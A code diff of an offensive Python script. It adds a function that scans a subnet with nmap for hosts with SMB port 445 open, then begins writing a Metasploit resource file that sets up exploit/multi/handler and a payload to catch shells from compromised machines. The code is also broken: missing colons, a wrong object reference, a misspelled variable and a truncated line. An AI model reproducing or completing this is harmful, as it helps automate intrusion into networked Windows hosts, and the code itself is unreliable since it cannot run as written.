@@ -5,13 +5,25 @@ import optparse
 import sys
 import nmap
 
-def findtarget()
+def findtarget(subnet):
+	nmapscan = nmap.PortScanner()
+	nmapscan.scan(subnet,'445')
+	targethosts=[]
+	for host in nmapscan.all_hosts():
+		if nmap[host].has_tcp(445):
+			state = nmapscan[host]['tcp'][445]['state']
+			if state == 'open':
+				print ('[+] Found Target Host:'+host)
+				targethosts.append(host)
+	return targethosts
+
+
+
+
+def setuphandler(configfile,lhost,lport)
+	configfile.write('use exploit/multi/handler\n')
+	cnofigfile.write('set payload '+
 	
-
-
-
-def setuphandler()
-
 
 
 
